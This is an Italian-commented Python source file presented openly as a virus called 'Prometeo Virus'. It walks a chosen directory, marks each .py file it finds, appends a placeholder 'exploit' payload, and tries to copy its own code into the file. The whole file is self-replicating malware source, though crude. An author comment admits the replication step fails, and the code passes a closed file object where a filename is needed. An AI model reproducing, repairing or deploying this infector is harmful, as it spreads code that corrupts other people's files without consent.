
# Importazioni necessarie

import os, sys, shutil, random, glob, time

viruskey = "#! My Virus Key: 1x2y3z"
infettato = "No"
banner = """
+-----------------+----------------+
| Prometeo Virus | Coded by Godlik |
+----------------+-----------------+
| Versione: 1.1  | Data: 8/1/2017  |
+----------------+-----------------+
	  """
myself = sys.argv[0]

#1 indentificazione

def identificazione():

	_path_ = os.getcwd() # ottengo la directory corrente
	for path, directory, files in os.walk(_path_): # ottengo tutte le directory, sottodirectory e files prsenti nella path
		for file in files:
			time.sleep(0.5)
			_file_, punto, estensione = file.partition('.') # Suddivide il file in tre parti separate dal punto, se dopo il punto 
			if estensione == "py": # vi è py (estensione file python) il il file e' infettabile
				try:
					infettato = "No"
					fileopen = open(file, 'r') # Apri il file per leggerlo
					for line in fileopen: # Analizzo le righe			
						if viruskey in line: #Se non trovi la key del virus il file non e' infetto
							infettato = "Si"
							print("[*] File gia' infettato > " + file)
							break
					if infettato == "No": # Avvia infezione del file non infetto
						print("[+] Infetto il file... " + file)
						infezione(file)
				except FileNotFoundError:
					pass
			else:
				pass

#2 Infezione

#exploit = """"""
def infezione(file):
	
	exploitstatus = "No" # Stato dell'Exploit negativo (vuol dire che non e' stato ancora iniettato)
	exploit =  "#" #'print("Exploited_)' # Questo è l'Exploit, e' possibile cambiarlo con altri
	print("\n[*] Preparo l'Exploit...")
	try:
		file = open(file, 'a') # Apro il file
		file.write("\n" + viruskey + "\n" + exploit) # Inietto l'exploit nel file vittima
		exploitstatus = "Si" # Stato dell' exploit positivo (exploit iniettato)
		file.close() # Chiudo il file
	except FileNotFoundError:
		pass
	if exploitstatus == "Si": # Se l'exploit è stato iniettato procendi con la Replicazione
		print("[+] Infezione Riuscita")
		print("[*] Mi copio nel file...")
		miacopia(file)
	else:
		pass


def miacopia(file): # Qui ho dei problemi, non mi scrive nulla nei file in cui dovrebbe copiarsi
	myself = sys.argv[0]
	myself = open(myself, 'r')
	file = open(file, 'a')
	for line in myself:
		file.write(line)
	print("[+] File infettato Correttamente!")
	file.close()
	myself.close()

if __name__ == '__main__':
	
	print(banner) # Banner
	try:
		directory = input("Path >> ")
		os.chdir(directory) # Cambia directory in quella inserita
	except FileNotFoundError :
		print("[!] Path non Trovata")
		exit
	identificazione()
